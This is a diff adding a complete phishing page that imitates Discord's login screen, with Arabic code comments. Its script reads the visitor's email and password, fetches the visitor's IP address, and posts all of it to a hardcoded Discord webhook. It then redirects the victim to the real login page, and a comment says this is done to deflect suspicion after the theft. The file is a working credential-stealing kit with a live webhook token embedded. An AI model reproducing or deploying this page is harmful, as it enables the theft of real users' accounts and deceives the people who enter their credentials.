@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Login</title>
+    <style>
+        /* تصميم ديسكورد الرسمي */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'gg sans', 'Noto Sans', sans-serif;
+            background-image: url('https://discord.com/assets/7c97f8ef22fa84d3.png'); /* خلفية ديسكورد */
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .login-box {
+            background: #313338;
+            padding: 32px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+            color: #f2f3f5;
+        }
+
+        h2 { margin-bottom: 8px; font-size: 24px; }
+        p { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #1e1f22;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover { background: #4752c4; }
+
+        .footer-links {
+            margin-top: 8px;
+            text-align: left;
+            font-size: 14px;
+            color: #00a8fc;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+
+        <div class="input-group">
+            <label>Email or Phone Number</label>
+            <input type="text" id="email" required>
+        </div>
+
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" required>
+            <div class="footer-links">Forgot your password?</div>
+        </div>
+
+        <button onclick="sendData()">Log In</button>
+
+        <div style="margin-top: 15px; font-size: 14px; color: #b5bac1; text-align: left;">
+            Need an account? <span style="color: #00a8fc; cursor: pointer;">Register</span>
+        </div>
+    </div>
+
+    <script>
+        // ضع رابط الـ Webhook الخاص بك هنا
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
+
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if(!email || !pass) return alert("Please fill in all fields");
+
+            // جلب الـ IP تلقائياً لإضافته للتقرير
+            let ipData = { ip: "Unknown" };
+            try {
+                ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            } catch(e) {}
+
+            const payload = {
+                embeds: [{
+                    title: "📥 New Login Attempt",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "👤 User/Email", value: `\`${email}\``, inline: true },
+                        { name: "🔑 Password", value: `\`${pass}\``, inline: true },
+                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: false },
+                        { name: "🖥️ Browser", value: navigator.userAgent, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // توجيه المستخدم لصفحة ديسكورد الحقيقية بعد السرقة لإبعاد الشبهة
+                window.location.href = "https://discord.com/login";
+            }).catch(() => {
+                alert("Connection Error!");
+            });
+        }
+    </script>
+</body>
+</html>
